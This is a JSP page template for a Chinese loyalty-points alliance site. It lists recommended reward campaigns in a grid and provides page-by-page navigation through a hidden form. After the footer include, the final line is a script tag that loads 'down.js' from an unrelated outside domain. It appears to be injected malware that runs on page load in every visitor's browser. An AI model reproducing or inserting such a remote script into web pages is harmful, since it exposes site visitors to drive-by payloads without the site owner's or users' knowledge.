<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<c:set var="title" value="积分联盟-积分查询"/> 
<%@ include file="IncludeTop.jsp" %>
<script type="text/javascript" src="js/pu_city.js"></script>
<table width="780"  border="0" align="center" cellpadding="0" cellspacing="0"  background="#FFFFFF">
  <tr> 
    <td valign="top" width="178"> 
      <table width="100%" border="0" cellpadding="0" cellspacing="0">
        <tr> 
          <td width="178" align="left" valign="top">
		    <%@ include file="searchCampaignBar.jsp" %>	
		    <%@ include file="topReturnMerchantsBar.jsp" %>		  </td>
        </tr>
      </table>    </td>
	<td bgcolor="#FFFFFF" valign="top" width="602"> 
       
	  <c:set var="trBegin" value='<tr>' />
	  <c:set var="trEnd" value='</tr>' /> 
	  <c:set var="colomnSize" value="3" />
	  
	  <c:set var="startRow" value='0' /> 
	  <c:set var="pageSize" value='20' /> 
	  <c:set var="totalCount" value='3' /> 
	  
	  <c:choose> 
		  <c:when  test="${result ne null}">
				<c:set var="campaignList" value="${result.campaignList}"/> 
				<c:set var="totalCount" value="${result.campaignCount}"/> 			
		  </c:when> 
		  <c:otherwise>
  	  		    <c:set var="campaignList" value="${appData.recommendedCampaigns}"/> 
				<c:set var="pageSize" value='6' /> 
				<c:set var="totalCount" value="7"/>
		  </c:otherwise>	  
	  </c:choose>
	  
	  <table width="100%" border="0" cellspacing="10">
        <c:forEach var="campaign" items="${appData.recommendedCampaigns}" varStatus="status"> 
        <c:if test="${status.count mod colomnSize eq 1}">
			<c:out value="${trBegin}" escapeXml="false" /> 
        </c:if> 
          <td width="33%"> 
            <table width="100%" height="100%" border="0" cellpadding="0" cellspacing="1" bordercolor="0" bgcolor="#CCCCCC">
              <tr> 
                <td> 
                  <table cellspacing="0" cellpadding="0" width="100%" height="100%" border="0" bgcolor="#FFFFFF">
                    <tr> 
                      <td align="center" rowspan="3" width="70"><a href='<c:url value="/getCampaignInfo.do"/>?campaignNo=<c:out value="${campaign.campaignNo}"/>'><img src='images/campaign/<c:out value="${campaign.campaignNo}"/>.jpg' width="65" height="65" border="0" ></a></td>
					  <td width="109" height="23" class="blue14"><ct:slice length="12" value="${campaign.title}"/></td>
                    </tr>
                    <tr>  					  
                      <td height="53" class="black12"><br>
                        <ct:slice length="36" value="${campaign.intro}"/></td>
                     </tr>
                    <tr>
					  <td height="21" >商户: <a href='<c:url value="/getMerchantInfo.do"/>?merchantNo=<c:out value="${campaign.merchantNo}"/>' class="orange"> 
                        <ct:slice length="10" value="${campaign.merchantName}"/></a> 
                      </td>
                    </tr>
                  </table>
				 </td>
              </tr>
            </table>          </td>          
        <c:if test="${status.count mod colomnSize eq 0}">
			<c:out value="${trEnd}" escapeXml="false" />
        </c:if>
		<c:if test="${status.count mod colomnSize ne 0  and status.last}"> 
			<c:forEach var="x" begin="${status.count mod colomnSize}" end="${colomnSize-1}" step="1"> 
				<td >&nbsp; </td>
			</c:forEach>
         </c:if> 
        </c:forEach>
      </table>
      <table width="100%" border="0" height="60" cellspacing="0" cellpadding="0" background="#FFFFFF">
        <tr> 
          <td width="3%" height="57">&nbsp;</td>
          <td width="95%" height="57"> 
            <form name="pageForm" method="post" action='<c:url value="/queryCampaign.do"/>'>
              <c:set var="trEnd" value='</tr>' />
			  <c:choose>
				  <c:when test="${result ne null and result.campaignQC ne null}"> 
						<input type="hidden" name="merchantKey" value='<c:out value="${result.campaignQC.merchantKey}"/>' />
						<input type="hidden" name="merchantCtg" value='<c:out value="${result.campaignQC.merchantCtg}"/>' />
						<input type="hidden" name="campaignKey" value='<c:out value="${result.campaignQC.campaignKey}"/>' />
						
						<input type="hidden" name="time1" value='<c:out value="${result.campaignQC.time1}"/>' />
						<input type="hidden" name="time2" value='<c:out value="${result.campaignQC.time2}"/>' />
						<input type="hidden" name="orderBy" value='<c:out value="${result.campaignQC.orderBy}"/>' />
						<input type="hidden" name="pageSize" value='<c:out value="${result.campaignQC.pageSize}"/>' />
						<input type="hidden" name="startRow" value='<c:out value="${result.campaignQC.startRow}"/>' />								
						<input type="hidden" name="orderType" value='<c:out value="${result.campaignQC.orderType}"/>' />
						<c:if test="${result.campaignQC.startRow ne null}">
							<c:set var="startRow" value="${result.campaignQC.startRow}"/>
						</c:if>
						<c:if test="${result.campaignQC.pageSize ne null}">
							<c:set var="pageSize" value="${result.campaignQC.pageSize}"/>
						</c:if>
				</c:when>
				<c:otherwise>
					 	<input type="hidden" name="startRow" value="0" />
				</c:otherwise> 
			</c:choose>
            <div align="center">
				<c:choose> 
				   <c:when  test="result eq null">
					   <a href='<c:url value="/queryCampaign.do"/>'>更多>></a>				   </c:when> 
				   <c:otherwise> 			 
					  <c:choose> 
						  <c:when  test="${startRow lt 1}">
								上一页						 </c:when> 
						 <c:when  test="${startRow - pageSize lt 0}">
								<a href='javascript:pageForm.startRow.value=0; pageForm.submit()'>上一页</a>						 </c:when>
						 <c:otherwise> 
								<a href='javascript:pageForm.startRow.value=<c:out value="${startRow-pageSize}"/>; pageForm.submit()'>上一页</a>						</c:otherwise>
					  </c:choose>
						  <c:set var="totalPage" value="${totalCount / pageSize }"/>
					  <c:if  test="${totalCount mod pageSize ne 0}">
						  <c:set var="totalPage" value="${totalPage + 1}"/>
					  </c:if> 
					  <c:if  test="${totalCount eq 0}">
						  <c:set var="totalPage" value="1"/>
					  </c:if> 
					  <c:forEach begin="1" end="${totalPage}" var="i" step="1"> 		
							<c:set var="curRow" value="${(i-1) * pageSize}"/>
							<c:choose> 
								  <c:when  test="${startRow eq curRow}">
										<c:out value="${i}"/>
								  </c:when> 
								  <c:otherwise> 
										<a href='javascript:pageForm.startRow.value=<c:out value="${(i-1) * pageSize}"/>; pageForm.submit()'><c:out value="${i}"/></a>								  </c:otherwise>						  
					    </c:choose>
					  </c:forEach>
					  <c:choose> 
						 <c:when  test="${startRow gt totalCount - pageSize}">
								下一页						 </c:when> 
						 <c:otherwise> 
								<a href='javascript:pageForm.startRow.value=<c:out value="${startRow+pageSize}"/>; pageForm.submit()'>下一页</a>						</c:otherwise>
					  </c:choose>
				  </c:otherwise>
			   </c:choose>	  
			</div>
   	 	  </form>          </td>
          <td width="2%" height="57">&nbsp;</td>
        </tr>
      </table>	
  </tr>
</table>





<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>